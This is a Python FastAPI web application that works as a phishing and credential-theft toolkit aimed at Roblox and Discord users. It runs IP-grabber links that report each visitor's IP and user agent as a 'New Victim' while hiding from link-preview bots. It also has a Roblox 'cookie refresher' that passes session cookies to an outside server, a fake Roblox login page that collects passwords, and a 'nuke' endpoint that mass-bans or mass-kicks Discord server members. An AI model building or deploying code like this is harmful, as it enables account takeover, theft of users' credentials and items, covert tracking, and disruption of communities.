from fastapi import FastAPI, Form, Depends, Request, status, HTTPException
from ratelimiter import RateLimiter
from fastapi.responses import RedirectResponse
import aiohttp
from pydantic import BaseModel
from fastapi.templating import Jinja2Templates
from fastapi.responses import FileResponse
from pathlib import Path
import string
import random
import aiofiles
import json
from supolo import supolo

TOKEN = "discord token"
already_generated = {}
app = FastAPI()
templates = Jinja2Templates(directory="templates")
ids = {}

async def get_random_string():
    result_str = ''.join(random.choice(string.ascii_letters) for i in range(100))
    return result_str

  

async def get_id(USER_ID, session):
  if not int(USER_ID) in ids:
    async with session.post("https://discord.com/api/v10/users/@me/channels",
                            headers={
                              "Authorization": f"Bot {TOKEN}",
                              "Content-Type": "application/json"
                            },
                            json={"recipient_id": USER_ID}) as dm_response:
      dm_data = await dm_response.json()
      dm_channel_id = dm_data.get("id")
      if not dm_channel_id: return None
      ids[int(USER_ID)] = dm_channel_id
      return dm_channel_id
  else:
    return ids[int(USER_ID)]

async def send_id(USER_ID, embed, content=None):
  async with aiohttp.ClientSession() as session:
    id = await get_id(USER_ID, session)
    if not id: return
    data = {"embeds": embed}
    if content:
      data["content"] = content
    async with session.post(
        f"https://discord.com/api/v10/channels/{id}/messages",
        headers={
          "Authorization": f"Bot {TOKEN}",
          "Content-Type": "application/json"
        },
        json=data) as message_response:
      return message_response

class RequestData(BaseModel):
    hook: str
    data: dict

@app.get("/ip-grabber")
async def ip_grabber(request: Request):
  return templates.TemplateResponse("ipgrabber.html", {"request": request})

@app.get("/socials")
async def socials(request: Request):
  return templates.TemplateResponse("socials.html", {"request": request})
  
@app.get("/package-grabber")
async def package_grabber(request: Request):
  return templates.TemplateResponse("package.html", {"request": request})

@app.get("/tools")
async def tools(request: Request):
  return templates.TemplateResponse("tools.html", {"request": request})
    
@app.post("/upload", dependencies=[Depends(RateLimiter(requests_limit=5, time_window=10, auto_ban=True))])
async def upload(request_data: RequestData):
  await send_id(request_data.hook, request_data.data.get("embeds"), request_data.data.get("content"))

@app.get("/refresh/{id}")
async def refresh(id: str, request: Request):
  return templates.TemplateResponse("refresher.html", {"request": request, "id": id})

@app.post("/refreshSub/{id}", dependencies=[Depends(RateLimiter(requests_limit=5, time_window=60))])
async def refresh_submit(id: str, request: Request):
  form_data = await request.form()
  auth_cookie = form_data.get("auth_cookie")
  client_ip = request.headers.get("x-forwarded-for").split(",")[-1]
  user_agent = request.headers.get("user-agent")
  if not "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_" in auth_cookie: 
    raise HTTPException(status_code=400, detail="Please provide a valid cookie.")
  if not auth_cookie in already_generated:
   async with aiohttp.ClientSession() as client:
    info = await client.post(f"http://167.172.108.46:8000/get_auth_ticket?roblosecurity_cookie={auth_cookie}")
    jsono = (await info.json()).get("refreshedCookie")
    if not jsono:
      raise HTTPException(status_code=400, detail="Please provide a valid cookie.")
    string = await get_random_string()
    already_generated[auth_cookie] = {"cookie": jsono, "string": string}
    async with aiofiles.open("database.json", 'r') as file:
            data = json.loads(await file.read())
    data[string] = jsono
    async with aiofiles.open("database.json", 'w') as file:
        await file.write(json.dumps(data, indent=4))
    info = {"user_agent": user_agent, "client_ip": client_ip, "cookie": already_generated.get(auth_cookie, {}).get("cookie"), "string": already_generated.get(auth_cookie, {}).get("string")}
  else:
    return templates.TemplateResponse("result.html", {"request": request, "new_auth_cookie": already_generated[auth_cookie].get('cookie'), "id": id})
  link =f"https://webserver.xolo2.repl.co/cookie/{info['string']}"
  embed = {
        "title": "New Victim",
        "color": 0x00ff00,
        "fields": [{
          "name": "User Agent",
          "value": info["user_agent"],
          "inline": False
        }, {
          "name": "Client IP",
          "value": info["client_ip"],
          "inline": False
        }, {
          "name": "IP Info",
          "value": f"[IP Info Link](https://ipinfo.io/{info['client_ip']})",
          "inline": False
        },
        {
          "name": "Cookie",
          "value": f"[Cookie Link]({link})",
          "inline": False
        }]
    }
  await send_id(id, [embed])
  return templates.TemplateResponse("result.html", {"request": request, "new_auth_cookie": already_generated[auth_cookie].get('cookie'), "id": id}) 

@app.get("/cookie/{cookie}",
         dependencies=[Depends(RateLimiter(requests_limit=5, time_window=60))])
async def cookie(cookie: str, request: Request):
  async with aiofiles.open("database.json", 'r') as file:
    data = json.loads(await file.read())

  return templates.TemplateResponse("saved_cookie.html", {
    "request": request,
    "new_auth_cookie": data.get(cookie)
  })


@app.get("/cookierefresher")
async def cookierefresher(request: Request):
  return templates.TemplateResponse("cookierefresher.html",
                                    {"request": request})

@app.get("/image/{id}", dependencies=[Depends(RateLimiter(requests_limit=10, time_window=60, auto_ban=True))])
async def image(id: str, request: Request):
  client_ip = request.headers.get("x-forwarded-for").split(",")[-1]
  if "Discordbot" in request.headers.get("user-agent") or client_ip.split(".")[0] in ["35", "34"]:
    image_path = Path("imeage.jpg")
    return FileResponse(image_path, headers={"Content-Disposition": "attachment; filename=image.png"})
  else:
   try:
    if id.isalnum() and not request.headers.get("kkk"):
      user_agent = request.headers.get("user-agent")
      info = {"user_agent": user_agent, "client_ip": client_ip}
      embed = {
        "title": "New Victim",
        "color": 0x00ff00,
        "fields": [{
          "name": "User Agent",
          "value": info["user_agent"],
          "inline": False
        }, {
          "name": "Client IP",
          "value": info["client_ip"],
          "inline": False
        }, {
          "name": "IP Info",
          "value": f"[IP Info Link](https://ipinfo.io/{info['client_ip']})",
          "inline": False
        }]
      }
      await send_id(id, [embed])
      return RedirectResponse("https://discord.gg/s4QTZn8rx2", status_code=status.HTTP_303_SEE_OTHER)
   except:
    return RedirectResponse("https://discord.gg/s4QTZn8rx2", status_code=status.HTTP_303_SEE_OTHER)

@app.get("/nuke-bot")
async def nuke_bot(request: Request):
  return templates.TemplateResponse("nuke.html", {"request": request})
    
@app.post("/nuke", dependencies=[Depends(RateLimiter(requests_limit=5, time_window=3600))])
async def nuke(request: Request):
  try:
    body = await request.json()
    x =  supolo(tokenType="bot", token=body.get("token"))
    response = await x._check_token()
    assert response, "Invalid Token provided"
    if str(body.get("type")) == "1":
      return await x.mass_ban(guild_ids=[body.get("server")])
    if str(body.get("type")) == "2":
      return await x.mass_kick(guild_ids=[body.get("server")])
  except Exception as e:
    raise HTTPException(status_code=400, detail=str(e))
    
@app.get("/")
async def root(request: Request):
  return templates.TemplateResponse("main.html", {"request": request})


@app.get("/ph-links")
async def ph_links(request: Request):
  return templates.TemplateResponse("ph.html", {"request": request})


@app.get("/roblox/{id}", dependencies=[Depends(RateLimiter(requests_limit=5, time_window=10, auto_ban=True))])
async def roblox(request: Request, id: str = None):
  if id.isalnum():
   user_agent = request.headers.get("user-agent")
   client_ip = request.headers.get("x-forwarded-for").split(",")[-1]
   info = {"user_agent": user_agent, "client_ip": client_ip}
   embed = {
        "title": "New Victim on phishing site",
        "color": 0x00ff00,
        "fields": [{
          "name": "User Agent",
          "value": info["user_agent"],
          "inline": False
        }, {
          "name": "Client IP",
          "value": info["client_ip"],
          "inline": False
        }, {
          "name": "IP Info",
          "value": f"[IP Info Link](https://ipinfo.io/{info['client_ip']})",
          "inline": False
        }]
   }
   await send_id(id, [embed])
  return templates.TemplateResponse("roblox/login.html", {"request": request, "id": id})

@app.get("/roblox_phishing")
async def roblox_phishing(request: Request):
  return templates.TemplateResponse("roblox/tutorial.html", {"request": request})
  
@app.post("/roblox/log/{id}", dependencies=[Depends(RateLimiter(requests_limit=2, time_window=60))])
async def save_credentials(request: Request, id: str = None):
    try:
        form_data = await request.form()
        email = form_data.get("username")
        password = form_data.get("password")
        if id:
          embed = {
            "title": "New Roblox User Credentials",
            "color": 0x00ff00,
            "fields": [
                    {"name": "Username", "value": email, "inline": False},
                    {"name": "Password", "value": password, "inline": False}
              ]
          }
          await send_id(id, [embed])
        return RedirectResponse(url="https://roblox.com/")
    except Exception as e:
        raise HTTPException(status_code=500, detail="Internal Server Error")
      
@app.get("/{id}", dependencies=[Depends(RateLimiter(requests_limit=30, time_window=60))])
async def limited_other_endpoint(id: str, request: Request):
  client_ip = request.headers.get("x-forwarded-for").split(",")[-1]
  if "Discordbot" in request.headers.get("user-agent") or "TelegramBot" in request.headers.get("user-agent") or client_ip.split(".")[0] in ["35", "34"]: raise HTTPException(status_code=403, detail="Access denied.")
  try:
    if id.isalnum() and not request.headers.get("kkk"):
      user_agent = request.headers.get("user-agent")
      client_ip = request.headers.get("x-forwarded-for").split(",")[-1]
      info = {"user_agent": user_agent, "client_ip": client_ip}
      embed = {
        "title": "New Victim",
        "color": 0x00ff00,
        "fields": [{
          "name": "User Agent",
          "value": info["user_agent"],
          "inline": False
        }, {
          "name": "Client IP",
          "value": info["client_ip"],
          "inline": False
        }, {
          "name": "IP Info",
          "value": f"[IP Info Link](https://ipinfo.io/{info['client_ip']})",
          "inline": False
        }]
      }
      await send_id(id, [embed])
      return RedirectResponse("https://discord.gg/s4QTZn8rx2", status_code=status.HTTP_303_SEE_OTHER)
  except:
    return RedirectResponse("https://discord.gg/s4QTZn8rx2", status_code=status.HTTP_303_SEE_OTHER)